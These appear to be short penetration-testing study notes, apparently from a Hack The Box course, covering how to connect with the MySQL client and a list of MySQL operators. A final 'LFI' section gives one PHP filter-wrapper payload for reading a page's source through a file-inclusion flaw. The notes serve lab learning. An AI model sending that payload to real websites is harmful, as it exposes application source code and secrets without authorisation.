## SQL injection (SQLi)
### MySQL Basics

To interact with MySQL/MariaDB we can use the `mysql` binary.

```shell
$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 

Enter password: 
...SNIP...

mysql> 
```
```text
*(-u    = User
  -h    = Host
  -P    = Port
  -p    = Password)
```
#### Operators

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

For an overview please have a look at the (MySQL cheatsheet)[https://devhints.io/mysql].
## LFI

```
entry=php://filter/convert.base64-encode/resource=index.php
```